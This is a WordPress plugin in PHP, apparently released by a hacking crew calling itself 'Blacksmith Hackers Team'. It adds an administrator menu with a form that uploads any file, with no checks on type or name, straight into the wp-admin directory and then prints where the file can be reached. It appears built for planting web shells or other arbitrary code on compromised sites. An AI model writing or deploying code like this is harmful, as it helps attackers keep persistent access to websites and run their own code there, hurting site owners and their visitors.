<?php

/*
Plugin Name: BHT Wp Uploader
Plugin URI: https://facebook.com/BLACKSMITH.HACKERS
Description: Simple Wordpress File Uploader Plugin For BHT Crews......
Version: 1.0
Author: Imran Md. Aziul Islam
Author URI: https://facebook.com/liquid.imran
License: GPL2
License URI: https://www.gnu.org/licenses/gpl-2.0.html
*/

// Registering Custom Plugin And Intergrating It To Wordpress API

add_action( 'admin_menu', 'liquid_main_callback' );

function liquid_main_callback(){
	add_menu_page( 'BlackSmith Hackers', 'BHT', 'administrator', 'bht_uploader', 'liquid_uploader_callback'); 
}

// Working On Adminstrator Page And Adding Function

function liquid_uploader_callback(){
		echo '
		<div align="center" style="margin-top:50px">
		  <img src="http://s1.directupload.net/images/130831/2xlwno8m.png" width="20%" height="auto"/>
		  <h1>Blacksmith Hackers</h1>
		  <h2>.:: Developer: Liquid Acid ::.</h2>
		</div> ';
}

// Registering Sub Menu 

add_action('admin_menu', 'submenu_page');

function submenu_page() {
	add_submenu_page( 'bht_uploader', 'BHT Uploader', 'Uploader', 'administrator', 'bht_file', 'submenu_page_callback' );
}


// Working On Sub Menu Functions

function submenu_page_callback(){
        main_function();
?>

<?php

}
function main_function(){

  echo '
  <div style="margin-top:20px;">
		  <img src="http://s1.directupload.net/images/130831/2xlwno8m.png" width="20%" height="auto"/>
		  <h1>Blacksmith Hackers Team</h1>
     <h2>Upload File Here</h2>
		</div>';

	if(isset($_POST['Submit'])){
		$filedir = ""; 
		$maxfile = '2000000';
		$userfile_name = $_FILES['image']['name'];
		$userfile_tmp = $_FILES['image']['tmp_name'];
    if (isset($_FILES['image']['name'])) {
        $abod = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $abod);
  
	echo "<b>Done</br>Go Here ::: /wp-admin/$userfile_name</b>";
	}
	}
	else{
		echo'
		<form method="POST" action="" enctype="multipart/form-data"><input type="file" name="image"><input type="Submit" name="Submit" value="Submit"></form>';
	}

}
 
 
?>